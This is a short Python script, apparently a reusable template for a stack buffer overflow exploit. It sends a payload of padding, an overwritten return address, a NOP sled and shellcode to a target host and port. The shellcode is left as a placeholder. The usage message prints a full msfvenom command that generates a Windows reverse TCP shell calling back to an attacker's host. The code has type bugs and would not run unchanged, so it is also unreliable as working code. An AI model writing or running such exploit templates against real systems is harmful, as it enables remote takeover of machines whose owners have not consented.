import socket
import time
import sys

shellcode = ("place shellcode here")

if len(sys.argv) < 5:
    print("usage: \"python exploit.py [host] [port] [size] [eip]\"")
    print("usage: note that the inputBuffer's order may need to change based on targeted location!")
    exit(0)


host = sys.argv[1]
port = sys.argv[2]
size = sys.argv[3]
ret = sys.argv[4]
nop = 32

ret = ret.lower()
address = ""
for i in range(len(ret)-1,-1,-2):
        address += "\\x" + ret[i-1] + ret[i]

if shellcode == ("place shellcode here"):
    print("usage: need to add shellcode!!")
    print("usage: to do this, run: \"msfvenom -p windows/shell_reverse_tcp LHOST=[lhost] LPORT=[lport] EXITFUNC=thread -b [\\x00] -f c > exploit_shellcode")
    exit(0)

inputBuffer = "A" * size + address + "\x90" * nop + shellcode

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("sending buffer")
s.send(inputBuffer)
s.recv(1024)
s.close()



